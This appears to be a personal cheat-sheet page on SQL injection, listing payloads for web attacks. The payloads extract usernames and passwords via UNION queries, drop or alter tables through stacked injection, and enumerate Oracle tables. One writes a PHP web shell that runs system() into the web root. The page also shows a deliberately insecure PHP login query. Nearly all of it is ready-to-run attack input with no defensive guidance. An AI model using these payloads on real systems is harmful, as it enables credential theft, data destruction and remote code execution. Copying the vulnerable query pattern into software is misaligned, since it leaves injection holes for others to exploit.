# SQL Injection
[HOME](/index.html) / [Web](/Web)

## The basics

How an example of unsecure sql statement looks like:

<pre>
$SQL = "SELECT * FROM <i>{tablename}</i> WHERE <i>{username}</i> = ' + <b><i>$_POST["username"]</i></b> + ' AND ' + <b><i>$_POST['password']</i></b>'";
</pre>

To break the statement:

<pre>
$SQL = "SELECT * FROM <i>{tablename}</i> WHERE <i>{username}</i> = ' + <b><i>1' OR 1+1--</i></b> + ' AND ' + <b><i>$_POST['password']</i></b>'";
</pre>

Order by:
```SQL
=1 order by 1
=1 order by 2
=1 order by 3
.
.
.
Until error occurs, then:
=1 union all select 1, 2, 3...
=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
=1 union all select 1, username, password from users
```

### Simple SQL injection test
```SQL
'
1' OR 1+1--
\'
```
### Stacked injection; Where table name is known
```SQL
1'; DROP TABLE {tablename} --
```
### Where column name is known
```SQL
1'; ALTER TABLE {tablename} ALTER COLUMN {columnname} {datatype} --
1' UNION SELECT {columnname} FROM {tablename};--
1' UNION ALL SELECT {columnname} FROM {tablename};--
```

<br>

## Blind injection
Apply in URL
```SQL
www.example.com/xxx.php?id=1 or 1=1
```

## RCE with UNION
```
123' UNION SELECT '<?php echo system("ls -la /");?>','2','3','4','5' into outfile '/var/www/html/shell.php'#
```

## Oracle DB
```
' UNION SELECT table_name,null,null FROM all_tables--
' UNION SELECT  column_name,null,null FROM all_tab_columns WHERE table_name=''--
' UNION SELECT [col1],[col2],null FROM [table]--
```
